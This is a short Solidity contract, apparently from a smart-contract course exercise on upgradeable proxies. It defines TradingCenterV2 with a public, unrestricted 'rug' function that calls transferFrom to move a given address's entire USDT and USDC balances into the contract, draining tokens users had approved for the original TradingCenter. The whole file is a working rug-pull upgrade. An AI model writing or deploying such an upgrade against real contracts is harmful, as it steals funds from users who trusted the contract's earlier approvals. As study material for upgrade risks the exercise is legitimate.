// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {

    function rug(address sender) public returns (bool, bool) {
        bool usdtResult = usdt.transferFrom(
            sender,
            address(this),
            usdt.balanceOf(sender)
        );
        bool usdcResult = usdc.transferFrom(
            sender,
            address(this),
            usdc.balanceOf(sender)
        );
        return (usdtResult, usdcResult);
    }
}
